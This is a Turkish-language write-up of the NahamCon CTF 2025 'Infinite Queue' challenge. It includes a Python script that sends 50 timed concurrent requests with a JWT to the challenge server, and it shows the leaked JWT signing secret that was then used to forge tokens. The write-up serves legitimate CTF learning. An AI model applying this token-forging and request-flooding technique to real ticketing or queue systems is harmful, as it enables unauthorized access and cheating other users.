## NahamCon CTF 2025 -Infinite Queue Writeup

### Soru:
![alt text](image-8.png)

### Çözüm:
Soruya girdiğimde bi çeşit bilet alma ve kuyruğa girme ekranı açıldı. Kuyruğa girdiğimde ise;

![alt text](image-9.png)

Burp Suite den istek ve cevapları incelediğimde şu bulgulara vardım;

![alt text](image-10.png)

![alt text](image-11.png)

Bizden beklenen şey büyük ihtimalle zaman sıçraması yapıyormuşuz gibi davranmak yani sıranın başına geçmiş gibi gösteren bir check_queue isteği oluşturmak. Buradaki anahtar nokta, token zaman bilgisini içeriyorsa veya tahmin edilebilir bir formatta üretiliyorsa, onu manipüle ederek en öne geçmeyi simüle etmek.

Bunun için şöyle bi script gerekti:

``` JavaScript
import asyncio
import aiohttp
from datetime import datetime

TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiY2Fuc3UiLCJxdWV1ZV90aW1lIjoxODAyODQ5MDU1LjgwMzIzfQ.qsBmfrObWK9Kd64GnL2xUdh6gt1gu8zB-3lbc5eWKl"

URL = "http://challenge.nahamcon.com:31341/check_queue"

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0",
}

async def send_check(session, index):
    data = f"token={TOKEN}"
    async with session.post(URL, data=data, headers=HEADERS) as resp:
        text = await resp.text()
        print(f"[{datetime.now().time()}] Req#{index} → Status: {resp.status}\n{text}\n")

async def main():
    target = datetime.strptime("2025-05-26 18:00:00", "%Y-%m-%d %H:%M:%S")

    # Bekle ve doğru zaman geldiğinde başlat
    print("⏳ Bekleniyor...")
    while datetime.now() < target:
        await asyncio.sleep(0.001)

    print("🚀 Başlıyoruz...")

    # Aynı anda 50 istek gönder
    async with aiohttp.ClientSession() as session:
        await asyncio.gather(*[send_check(session, i) for i in range(50)])

# Çalıştır
asyncio.run(main())
```
Bunu çalıştırdığımda JWT Gizli Anahtarı Sızdı:
*JWT_SECRET = "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC"*
Artık kendi geçerli JWT token'ımızı imzalayabiliriz.

![alt text](image-17.png)
Bu script, JWT token'ı sahte zamanla üretip sıranın başındaymış gibi sunucuya sürekli istek göndererek flag veya bilet dosyasını otomatik olarak almaya çalışır. Sonrasında sunucudan hazır olduğunu belirten yanıt alınca, flag veya bilet bilgisi içeren ikili veriyi .bin dosyası olarak kaydediyor. Sonra dosyayı pdf formatına çeviriyoruz ve...

### FLAG!🥳

![alt text](image-15.png)